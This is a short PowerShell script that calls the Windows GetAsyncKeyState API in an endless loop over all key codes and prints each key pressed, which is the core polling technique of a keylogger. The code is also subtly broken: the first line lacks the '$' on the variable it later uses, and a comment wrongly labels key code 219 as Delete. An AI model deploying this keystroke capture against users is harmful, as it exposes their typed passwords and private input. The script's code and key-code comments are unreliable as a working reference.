Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
# 160:16 = Left shift
# 161:16 = Right shift
# 13 = enter
# 9 = tab
# 20 = caps
# 8 = backspace
# 219 = del
# 1 = LMB
# 2 = RMB
do
{
	for ($i = 0; $i -le 255; $i = $i + 1)
	{
		$keynum = [byte]$i
		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
		{
			$outkey = $keynum
			Write-Host -nonewline "${outkey}:"
		}
	}
} while($true)
